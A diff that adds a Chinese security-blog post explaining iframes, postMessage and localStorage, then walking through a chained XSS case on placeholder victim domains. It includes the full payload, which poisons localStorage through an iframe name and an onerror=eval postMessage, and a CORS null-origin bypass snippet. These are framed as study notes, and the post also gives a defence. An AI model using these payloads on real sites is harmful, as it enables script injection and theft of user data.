@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            跨窗口通信 &amp; localstorage =&gt; XSS
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#iframe%E5%AE%9E%E7%8E%B0%E5%B5%8C%E5%A5%97%E7%AA%97%E5%8F%A3"><span class="toc-text">iframe实现嵌套窗口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#postMessage%E5%AE%9E%E7%8E%B0%E8%B7%A8%E7%AA%97%E5%8F%A3%E9%80%9A%E4%BF%A1"><span class="toc-text">postMessage实现跨窗口通信</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#localstorage%E5%AE%9E%E7%8E%B0%E6%9C%AC%E5%9C%B0%E5%82%A8%E5%AD%98"><span class="toc-text">localstorage实现本地储存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iframe-postMessage-localstorage-XSS"><span class="toc-text">iframe + postMessage + localstorage &#x3D; XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <p>学长在之前分享过一个集跨窗口通信与localstorage一身的XSS漏洞，一直拖着没有整理。想来想去还是躲不掉的，今晚就此整理一下吧。先总结一下跨窗口通信与localstorage的笔记，最后再把这个XSS漏洞的过程梳理一遍。</p>
+<a id="more"></a>
+
+<h2 id="iframe实现嵌套窗口"><a href="#iframe实现嵌套窗口" class="headerlink" title="iframe实现嵌套窗口"></a>iframe实现嵌套窗口</h2><p>iframe标签可以在窗口内嵌套一个窗口，嵌入的窗口有它单独的 <code>document</code> 和 <code>window</code> 对象。当html中存在一个<code>&lt;iframe&gt;</code>标签时，有两种方式可以获取到它们：</p>
+<ul>
+<li><code>iframe.contentWindow</code> 是对 <code>&lt;iframe&gt;</code> 里 window 的引用。</li>
+<li><code>iframe.contentDocument</code> 是对 <code>&lt;iframe&gt;</code> 里的 document 对象的引用。</li>
+</ul>
+<p>除了直接上方的两种方式，还可以使用<code>window.frames</code>来获取<code>&lt;iframe&gt;</code>的窗口对象。</p>
+<ul>
+<li>通过索引获取：<code>window.frames[0]</code> —— 当前文档里第一个 iframe 的窗口。</li>
+<li>通过名称获取：<code>window.frames.iframeName</code> —— 获取 <code>name=&quot;iframeName&quot;</code> 的 iframe 窗口。</li>
+</ul>
+<p><strong>对iframe窗口的操作</strong></p>
+<p>如果是一个非同源窗口，我们可以对获取得到的对象进行以下的操作：</p>
+<ul>
+<li>通过 <code>iframe.contentWindow</code> 获取内部窗口的 window</li>
+<li>修改它的 <code>location</code></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://example.com&quot;</span> <span class="attr">id</span>=<span class="string">&quot;iframe&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 获取内部窗口的引用</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> iframeWindow = iframe.contentWindow;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 修改地址</span></span></span><br><span class="line"><span class="javascript">		iframe.contentWindow.location = <span class="string">&#x27;/&#x27;</span>;    </span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果是一个同源的窗口，可以对它的document对象进行任何的操作。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;/index.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;iframe&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 随便做任何事</span></span></span><br><span class="line"><span class="javascript">    iframe.contentDocument.body.prepend(<span class="string">&quot;Hello, world!&quot;</span>);</span></span><br><span class="line">  &#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>iframe标签的sandbox属性</strong></p>
+<p><code>sandbox</code> 属性允许在 <code>&lt;iframe&gt;</code> 中禁止某些特定操作，以避免执行一些不被信任的代码。它通过将它当做非同源的网页对待以及添加一些限制以实现 iframe 的沙盒化。</p>
+<p>sanbox有以下一写限制属性：</p>
+<ul>
+<li>allow-top-navigation 允许 <code>iframe</code> 修改父窗口的地址。</li>
+<li>allow-forms 允许在 <code>iframe</code> 内提交表单。</li>
+<li>allow-scripts 允许在 <code>iframe</code> 内运行脚本。</li>
+<li>allow-popups 允许来自 iframe 的 window.open 弹出窗口。</li>
+</ul>
+<p>之前记录的CORS的null值绕过时，就使用了iframe的box属性：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span>=<span class="string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> <span class="attr">src</span>=<span class="string">&#x27;data:text/html,&lt;script&gt;var req=new XMLHttpRequest();req.onload=reqListener;req.open(&quot;get&quot;,&quot;http://127.0.0.1/test.html&quot;,true);req.withCredentials=true;req.send();function reqListener()&#123;alert(this.responseText)&#125;;&lt;/script&gt;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="postMessage实现跨窗口通信"><a href="#postMessage实现跨窗口通信" class="headerlink" title="postMessage实现跨窗口通信"></a>postMessage实现跨窗口通信</h2><p>直接来看一个例子：</p>
+<p>iframe.html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="built_in">window</span>.addEventListener(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		alert(<span class="string">`Received <span class="subst">$&#123;event.data&#125;</span> from <span class="subst">$&#123;event.origin&#125;</span>`</span>);</span></span><br><span class="line">	&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>index.html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;iframe.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;iframe&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:block;height:60px&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      iframe.contentWindow.postMessage(<span class="string">&quot;Hello I&#x27;m Threezh1&quot;</span>, <span class="string">&#x27;*&#x27;</span>);</span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当打开<code>index.html</code>，就会弹出<code>Received Hello I&#39;m Threezh1 from http://localhost</code>的窗口。这个过程就是<code>index.html</code>给<code>iframe.html</code>发送信息的过程。</p>
+<p>postMessage有两个参数：</p>
+<ul>
+<li>data 要发送的数据</li>
+<li>targetOrigin 指定目标窗口的源，如<code>http://example.com</code>就是指定窗口中的源必须是example.com。如果不限制源，则填写为<code>*</code></li>
+</ul>
+<p>接受信息使用<code>addEventListener</code>添加一个<code>message</code>事件。事件中的<code>event</code>对象有以下属性：</p>
+<ul>
+<li><code>event.data</code> 从postMessage传递来的数据</li>
+<li><code>event.origin</code> 发送方的源</li>
+<li><code>event.source</code> 对发送方窗口的引用。如果我们需要的话可以立即回复 <code>postMessage</code></li>
+</ul>
+<p><strong>寻找postMessage导致的xss漏洞：</strong>从js中寻找类似于<code>message</code>接收器，往此页面发送：<code>window.postMessage(&quot;hello&quot;, &quot;*&quot;) </code>判断其能否形成XSS。</p>
+<p>这类XSS的防御：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveMessage</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line"> <span class="comment">// 来源信任</span></span><br><span class="line"> <span class="keyword">if</span> (event.origin !== <span class="string">&quot;http://example.com:8080&quot;</span>)</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line"> <span class="comment">// event.source作为回信的对象，并且把event.origin作为targetOrigin，避免泄露敏感信息。</span></span><br><span class="line"> event.source.postMessage(<span class="string">&quot;secret message&quot;</span>, event.origin); &#125;</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&quot;message&quot;</span>, receiveMessage, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="localstorage实现本地储存"><a href="#localstorage实现本地储存" class="headerlink" title="localstorage实现本地储存"></a>localstorage实现本地储存</h2><p>HTML5 提供了两种新的本地存储方案，sessionStorage和localStorage，统称WebStorage。</p>
+<p>sessionStorage 是针对session的数据存储，页面被关闭时，存储的数据会被清除。<br>localStorage 存储的数据可以长期保留</p>
+<p>localstorage的几种操作：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 增加数据</span></span><br><span class="line"><span class="built_in">localStorage</span>.setItem(<span class="string">&#x27;myCat&#x27;</span>, <span class="string">&#x27;Tom&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取数据</span></span><br><span class="line"><span class="keyword">let</span> cat = <span class="built_in">localStorage</span>.getItem(<span class="string">&#x27;myCat&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除数据</span></span><br><span class="line"><span class="built_in">localStorage</span>.removeItem(<span class="string">&#x27;myCat&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除所有数据</span></span><br><span class="line"><span class="built_in">localStorage</span>.clear();</span><br></pre></td></tr></table></figure>
+
+<h2 id="iframe-postMessage-localstorage-XSS"><a href="#iframe-postMessage-localstorage-XSS" class="headerlink" title="iframe + postMessage + localstorage = XSS"></a>iframe + postMessage + localstorage = XSS</h2><p>案例环境：</p>
+<p>A页面：<a target="_blank" rel="noopener" href="http://a.victim.com/myhonor.html">http://a.victim.com/myhonor.html</a> 这个页面存在两个问题：</p>
+<ul>
+<li>降域：页面将当前源通过JS设置成了父域<code>document.domain=&quot;victim.com&quot;</code></li>
+<li>存在从localstorage中取数据的操作，并且会将取出的值回显到页面上形成XSS</li>
+</ul>
+<p>B页面：<a target="_blank" rel="noopener" href="http://b.victim.com/ueditor.html">http://b.victim.com/ueditor.html</a> 这个页面存在一个message监听事件，并将postMessage传递来的数据回显到页面上，形成XSS漏洞</p>
+<p>目的： 从B页面到A页面的XSS漏洞</p>
+<p>从A页面的第二个问题中我们可以想到，我们可以通过污染localstorage的值来达到A页面中XSS的目的。最后构造出来的payload如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://a.victim.com/index.html&quot;</span> <span class="attr">name</span>=<span class="string">&quot;proxy&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">loadxss</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> frame = <span class="built_in">document</span>.createElement(<span class="string">&quot;iframe&quot;</span>);</span></span><br><span class="line"><span class="javascript">	frame.src = <span class="string">&quot;https://b.victim.com/ueditor.html&quot;</span>;</span></span><br><span class="line"><span class="javascript">	frame.name = <span class="string">&quot;document.domain=&#x27;victim.com&#x27;;ccc=function()&#123;top.proxy.localStorage.setItem(&#x27;app_friends_&#123;test&#125;&#x27;,&#x27;alert(999)&#x27;)&#125;;setInterval(&#x27;ccc ()&#x27;);&quot;</span>;</span></span><br><span class="line"><span class="javascript">	frame.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		<span class="built_in">window</span>[<span class="number">1</span>].postMessage(<span class="string">&#x27;&#123;&quot;sendEditorValue&quot;:&quot;&lt;img src=x onerror=eval(parent.name)&gt;&quot;&#125;&#x27;</span>, <span class="string">&quot;*&quot;</span>);</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.body.appendChile(frame);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>那执行的步骤又是怎么样的呢？</p>
+<ol>
+<li>通过iframe加载A页面</li>
+<li>通过js，创建一个iframe加载B页面</li>
+<li>将加载B页面的iframe命名为一个设置A页面localstorage的js</li>
+<li>给B页面发送postMessage请求</li>
+<li>B页面接受请求导致xss并执行B页面的iframe名称中的payload</li>
+<li>导致A页面的xss</li>
+</ol>
+<p><em>PS：这里的环境不是真实的环境，很多细节都已抹去。仅是为了学习其中的思路。此外，这里不直接通过B页面的XSS污染localstorage是为了绕过waf。</em></p>
+<p>通过这个例子给了一点新的思考……</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://zh.javascript.info/cross-window-communication">跨窗口通信</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/yanghuan313/article/details/55260232">基于localStorage的本地存储XSS</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage">Window.localStorage</a></li>
+</ul>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
